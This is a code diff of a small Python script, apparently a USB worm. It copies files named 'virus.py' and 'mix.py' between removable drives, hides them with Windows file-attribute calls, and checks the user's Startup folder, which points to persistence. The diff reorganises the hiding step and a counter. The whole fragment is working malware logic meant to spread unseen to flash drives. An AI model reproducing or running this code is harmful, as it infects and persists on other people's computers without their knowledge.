@@ -8,20 +8,19 @@ timer = 0
 while True:
     time.sleep(3)
     pwd = os.getcwd()
+    timer += 1
     if pwd == 'F:\\': #1
-        timer +=1
         try:
             cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
             cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
+            ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
+            ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
+            print('hidden sucsessful')
             print('run 1')
         except:
             print('error 1')
             pass
-        ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
-        ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
-        print('hidden execute')
-    elif pwd == 'I:\\':   #2
-        timer +=2
+    elif pwd == 'I:\\': #2
         try:
             cp_virus = shutil.copy('virus.py','f:')
             cp_mix = shutil.copy('mix.py','f:')
@@ -31,7 +30,7 @@ while True:
             print('error 2')
             pass
 
-     #3   
+    #3   
     elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user :
         try:
             #cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
